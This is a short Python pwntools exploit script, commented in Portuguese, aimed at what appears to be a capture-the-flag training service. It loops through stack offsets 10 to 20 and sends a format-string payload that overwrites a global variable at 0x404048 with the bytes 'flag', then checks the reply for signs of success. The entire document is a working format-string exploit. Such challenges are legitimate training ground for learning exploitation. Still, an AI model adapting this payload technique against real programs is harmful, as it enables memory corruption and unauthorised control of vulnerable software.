from pwn import *
context.log_level = 'error'

sus_addr = 0x404048
target_value = 0x67616c66

# Testa offsets de 10 a 20 para ver qual funciona com o fmtstr_payload
for offset in range(10, 21):
    try:
        io = remote('chatelaine.cylabacademy.net', 13826, timeout=2)
        payload = fmtstr_payload(offset, {sus_addr: target_value}, write_size='byte')
        
        io.sendlineafter(b"What do you have to say?\n", payload)
        response = io.recvall(timeout=2)
        
        if len(response) > 2:  
            print(f"[+] Offset {offset} funcionou! Resposta:")
            print(response.decode('utf-8', errors='ignore'))
            if b"wizard" in response or b"flag" in response or b"sus =" in response:
                print(f"[!] Possível sucesso no offset {offset}!")
                break
        io.close()
    except Exception:
        io.close()